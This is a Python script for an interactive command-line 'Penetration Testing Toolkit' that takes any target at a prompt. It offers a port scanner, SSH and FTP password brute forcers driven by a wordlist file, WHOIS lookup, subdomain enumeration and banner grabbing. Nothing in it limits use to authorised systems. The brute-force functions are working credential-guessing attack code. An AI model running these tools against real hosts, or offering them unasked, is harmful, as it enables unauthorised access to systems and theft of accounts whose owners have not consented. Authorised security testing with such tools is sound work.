import socket
import paramiko
import requests
import whois
from ftplib import FTP

# ---------------- Port Scanner ----------------
def port_scanner(target, ports):
    print(f"Scanning {target}...")
    for port in ports:
        try:
            s = socket.socket()
            s.settimeout(0.5)
            s.connect((target, port))
            print(f"[+] Port {port} is OPEN")
            s.close()
        except:
            pass

# ---------------- SSH Brute Forcer ----------------
def ssh_brute_force(host, user, password_file):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(password_file, 'r') as f:
        for password in f:
            try:
                client.connect(host, username=user, password=password.strip())
                print(f"[+] Success: {user}@{host} with password '{password.strip()}'")
                return
            except:
                continue
    print("[-] Brute force failed.")

# ---------------- FTP Brute Forcer ----------------
def ftp_brute_force(host, user, password_file):
    with open(password_file, 'r') as f:
        for pwd in f:
            try:
                ftp = FTP(host)
                ftp.login(user=user, passwd=pwd.strip())
                print(f"[+] Login Success: {user}:{pwd.strip()}")
                return
            except:
                continue
    print("[-] FTP brute force failed.")

# ---------------- WHOIS Lookup ----------------
def whois_lookup(domain):
    info = whois.whois(domain)
    print(info)

# ---------------- Subdomain Enumerator ----------------
def subdomain_enum(domain, wordlist_file):
    with open(wordlist_file, 'r') as f:
        for sub in f:
            url = f"http://{sub.strip()}.{domain}"
            try:
                res = requests.get(url)
                if res.status_code < 400:
                    print(f"[+] Found: {url}")
            except:
                continue

# ---------------- Banner Grabber ----------------
def banner_grabber(ip, port):
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((ip, port))
        banner = s.recv(1024).decode().strip()
        print(f"[+] Banner: {banner}")
    except:
        print("[-] Failed to grab banner.")

# ---------------- Main Menu ----------------
def main():
    while True:
        print("""
Penetration Testing Toolkit
----------------------------
1. Port Scanner
2. SSH Brute Force
3. FTP Brute Force
4. WHOIS Lookup
5. Subdomain Enumeration
6. Banner Grabbing
7. Exit
""")
        choice = input("Choose an option: ")

        if choice == '1':
            target = input("Target IP: ")
            ports = [21, 22, 23, 80, 443, 3306]
            port_scanner(target, ports)
        elif choice == '2':
            host = input("SSH Host: ")
            user = input("Username: ")
            password_file = input("Password file path: ")
            ssh_brute_force(host, user, password_file)
        elif choice == '3':
            host = input("FTP Host: ")
            user = input("Username: ")
            password_file = input("Password file path: ")
            ftp_brute_force(host, user, password_file)
        elif choice == '4':
            domain = input("Domain: ")
            whois_lookup(domain)
        elif choice == '5':
            domain = input("Target domain: ")
            wordlist_file = input("Subdomain wordlist path: ")
            subdomain_enum(domain, wordlist_file)
        elif choice == '6':
            ip = input("Target IP: ")
            port = int(input("Port: "))
            banner_grabber(ip, port)
        elif choice == '7':
            print("Exiting...")
            break
        else:
            print("Invalid option. Try again.")

if __name__ == "__main__":
    main()
